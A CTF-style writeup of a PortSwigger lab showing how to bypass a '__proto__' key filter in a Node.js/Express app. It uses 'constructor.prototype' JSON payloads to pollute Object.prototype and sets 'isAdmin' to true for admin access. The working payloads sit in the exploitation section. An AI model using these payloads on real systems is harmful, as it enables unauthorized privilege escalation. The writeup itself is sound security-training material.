# Bypassing flawed input filters for server-side prototype pollution

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution), you'll learn: Bypassing flawed input filters for server-side prototype pollution! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is built on Node.js and the Express framework. It is vulnerable to server-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

> Note:
>  
> When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222181758.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222181813.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222181821.png)

In here, we can update our billing and delivery address.

Let's try to update it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222181851.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222181855.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222181915.png)

When we clicked the "Submit" button, it'll send a POST request to `/my-account/change-address`, with parameter `address_line_1`, `address_line_2`, `city`, `postcode`, `country`, `sessionId`.

**If there's no error, the response will return a JSON data:**
```json
{
    "username": "wiener",
    "firstname": "Peter",
    "lastname": "Wiener",
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "isAdmin": false
}
```

### Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`

**Now, we can try to add arbitrary properties to the global `Object.prototype` via prototype pollution:**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "9zO14DRBcrJYKDNyCiBtv9R7Gkf04LMO",
    "__proto__": {
        "json spaces": 1
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222183017.png)

However, it seems like we didn't polluted an arbitrary property?

Now, websites often attempt to prevent or patch prototype pollution vulnerabilities by filtering suspicious keys like `__proto__`. This key sanitization approach is not a robust long-term solution as there are a number of ways it can potentially be bypassed. For example, an attacker can:

- Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see [Bypassing flawed key sanitization](https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization).
- Access the prototype via the constructor property instead of `__proto__`. For more information, see [Prototype pollution via the constructor](https://portswigger.net/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor)

Node applications can also delete or disable `__proto__` altogether using the command-line flags `--disable-proto=delete` or `--disable-proto=throw` respectively. However, this can also be bypassed by using the constructor technique.

**Armed with above information, we can try to pollute the global `Object.prototype` to add arbitrary properties by obfuscating the `__proto__` keyword:**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "9zO14DRBcrJYKDNyCiBtv9R7Gkf04LMO",
    "__pro__proto__to__": {
        "foo": "bar"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222182729.png)

Still nope.

Maybe the web application delete or disable `__proto__`...

**However, we can still bypass that via `constructor`.**

**In client-side prototype pollution, we can use the folllowing `constructor` to pollute the global `Object.prototype` to add arbitrary properties:**
```js
myObject.constructor.prototype
```

**We can also do that in server-side one:**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "9zO14DRBcrJYKDNyCiBtv9R7Gkf04LMO",
    "constructor": {
        "prototype": {
            "json spaces": 1
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222183253.png)

Nice! We've successfully identify that the web application is indeed vulnerable to server-side prototype pollution!

### Identify a gadget property that you can use to escalate your privileges

**In the response result, we see this:**
```json
{
    "username": "wiener",
    "firstname": "Peter",
    "lastname": "Wiener",
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "isAdmin": false
}
```

The `isAdmin` property is very interesting to us!

***What if we can leverage server-side prototype pollution to set that property's value to `true`?***
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "9zO14DRBcrJYKDNyCiBtv9R7Gkf04LMO",
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222183505.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222183514.png)

Nice! We now became an administrator!

Let's go to the admin panel and delete user `carlos`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222183547.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-8/images/Pasted%20image%2020230222183557.png)

# What we've learned:

1. Bypassing flawed input filters for server-side prototype pollution